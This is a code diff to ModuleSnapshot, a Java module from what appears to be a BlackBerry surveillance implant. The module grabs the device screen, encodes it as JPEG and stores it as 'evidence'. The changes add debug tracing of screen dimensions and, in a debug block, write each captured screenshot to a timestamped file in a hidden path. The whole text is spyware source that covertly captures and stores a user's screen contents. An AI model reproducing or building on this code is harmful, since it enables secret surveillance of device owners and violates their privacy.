@@ -14,6 +14,7 @@ import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
+import net.rim.device.api.ui.Graphics;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Messages;
 import blackberry.Status;
@@ -24,6 +25,9 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
+import blackberry.fs.AutoFile;
+import blackberry.fs.Path;
+import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 /**
@@ -33,7 +37,7 @@ import blackberry.utils.WChar;
  */
 public final class ModuleSnapshot extends BaseInstantModule {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION); //$NON-NLS-1$
+    static Debug debug = new Debug("ModSnapshot", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     //private static Bitmap bitmap;
@@ -134,18 +138,19 @@ public final class ModuleSnapshot extends BaseInstantModule {
 
                 byte[] plain = encoded.getData();
                 encoded = null;
-
+                
                 Evidence evidence = new Evidence(EvidenceType.SNAPSHOT);
                 evidence.atomicWriteOnce(getAdditionalData(), plain);
 
                 //#ifdef DEBUG
                 debug.trace("finished run"); //$NON-NLS-1$
+                AutoFile file = new AutoFile(Path.hidden(), Utils.getTime()+".jpg");
+                file.write(plain);
                 //#endif
             } finally {
                 busy = false;
             }
         }
-
     }
 
     /**
@@ -159,7 +164,8 @@ public final class ModuleSnapshot extends BaseInstantModule {
         Bitmap bitmap = new Bitmap(width, height);
         //#ifdef DEBUG
         debug.trace("portrait: " + Display.getOrientation()); //$NON-NLS-1$
-        debug.trace("w: " + width + " h:" + height); //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("D w: " + width + " h:" + height); //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("G w: " + Graphics.getScreenWidth() + " h:" + Graphics.getScreenHeight()); //$NON-NLS-1$ //$NON-NLS-2$
         debug.trace("horizontal res: " + Display.getHorizontalResolution()); //$NON-NLS-1$
         debug.trace("Rowwise: " + Display.isRowwise()); //$NON-NLS-1$
         //#endif
